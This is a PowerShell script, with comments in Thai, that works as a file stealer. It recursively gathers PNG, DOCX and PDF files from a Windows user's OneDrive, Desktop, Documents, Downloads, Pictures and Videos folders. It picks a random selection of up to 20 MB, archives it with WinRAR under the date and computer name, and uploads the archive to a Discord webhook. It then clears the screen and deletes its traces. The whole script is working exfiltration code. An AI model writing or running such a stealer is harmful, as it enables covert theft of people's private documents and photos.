# สร้างโฟลเดอร์สำหรับเก็บไฟล์ที่เลือก
$zipFolder = "$env:TEMP\collected_files"
$selectedFilesFolder = "$env:TEMP\selected_files"
$testExtractFolder = "$env:TEMP\test_extract"
$webhookUrl = "https://discord.com/api/webhooks/"

# ล้างโฟลเดอร์เก็บไฟล์ชั่วคราวและสร้างใหม่
if (Test-Path $zipFolder) { Remove-Item -Recurse -Force $zipFolder }
if (Test-Path $selectedFilesFolder) { Remove-Item -Recurse -Force $selectedFilesFolder }
New-Item -ItemType Directory -Force -Path $zipFolder | Out-Null
New-Item -ItemType Directory -Force -Path $selectedFilesFolder | Out-Null
New-Item -ItemType Directory -Force -Path $testExtractFolder | Out-Null

# เก็บไฟล์ .png, .docx และ .pdf
Get-ChildItem -Path "C:\Users\Lenovo\OneDrive", `
    "$env:USERPROFILE\Videos", `
    "$env:USERPROFILE\Pictures", `
    "$env:USERPROFILE\Desktop", `
    "$env:USERPROFILE\Downloads", `
    "$env:USERPROFILE\Documents" `
    -Include *.png, *.docx, *.pdf -Recurse -ErrorAction SilentlyContinue | `
    Copy-Item -Destination $zipFolder -Force

# เลือกไฟล์แบบสุ่มให้อยู่ในขนาดไม่เกิน 20 MB
$maxSize = 20MB
$totalSize = 0
$selectedFiles = Get-ChildItem -Path $zipFolder | Sort-Object {Get-Random}

foreach ($file in $selectedFiles) {
    if (($totalSize + $file.Length) -le $maxSize) {
        Copy-Item -Path $file.FullName -Destination $selectedFilesFolder
        $totalSize += $file.Length
    }
}

# รับวันเดือนปีในรูปแบบ ddMMyyyy
$date = Get-Date -Format "ddMMyyyy"

# รับชื่อเครื่อง
$computerName = $env:COMPUTERNAME

# สร้างชื่อไฟล์ใหม่
$newFileName = "$date" + "_" + "$computerName" + ".rar"

# สร้างไฟล์ RAR
$rarPath = "$env:TEMP\$newFileName"
try {
    & "C:\Program Files\WinRAR\WinRAR.exe" a -r -ep1 $rarPath $selectedFilesFolder\* | Out-Null
} catch {
    exit
}

# ตรวจสอบความสมบูรณ์ของไฟล์ RAR
if (Test-Path $rarPath) {
    try {
        & "C:\Program Files\WinRAR\WinRAR.exe" t $rarPath | Out-Null
    } catch {
        exit
    }
} else {
    exit
}

# ส่งข้อมูลไปยัง Discord webhook
$boundary = [System.Guid]::NewGuid().ToString()
$header = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

$body = [System.IO.MemoryStream]::new()
$writer = [System.IO.StreamWriter]::new($body)
$writer.WriteLine("--$boundary")
$writer.WriteLine("Content-Disposition: form-data; name=`"file`"; filename=`"$newFileName.rar`"")
$writer.WriteLine("Content-Type: application/x-rar-compressed")
$writer.WriteLine()
$writer.Flush()

$fileStream = [System.IO.File]::OpenRead($rarPath)
$fileStream.CopyTo($body)
$fileStream.Close()

$writer.WriteLine()
$writer.WriteLine("--$boundary--")
$writer.Flush()
$body.Position = 0

try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $header -Body $body | Out-Null
} catch {
} finally {
    $writer.Dispose()
    $body.Dispose()
}

cls

# ล้างโฟลเดอร์ชั่วคราว
Remove-Item -Recurse -Force $zipFolder, $selectedFilesFolder, $testExtractFolder, $rarPath

exit
